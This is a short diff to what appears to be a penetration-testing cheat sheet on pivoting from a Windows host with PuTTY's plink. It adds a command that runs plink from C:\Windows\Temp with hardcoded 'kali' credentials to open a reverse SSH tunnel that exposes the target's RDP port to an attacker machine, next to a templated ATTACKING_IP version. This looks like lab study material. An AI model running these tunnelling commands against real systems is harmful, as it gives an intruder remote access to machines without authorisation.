@@ -19,8 +19,11 @@ puttygen KEYFILE -o OUTPUT_KEY.ppk
 Use PUTTY on Windows 
 ```powershell
 # `cmd.exe /c echo y` = non-interactive shell (Windows shells are difficult to stabilise)
+# Yikes on password recording here!
+# To get a response prompt automate the confirmation 
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 $IPaddressYouCanReach
+# Keyfile avaliable
 cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
-
 ```
 
 ## References
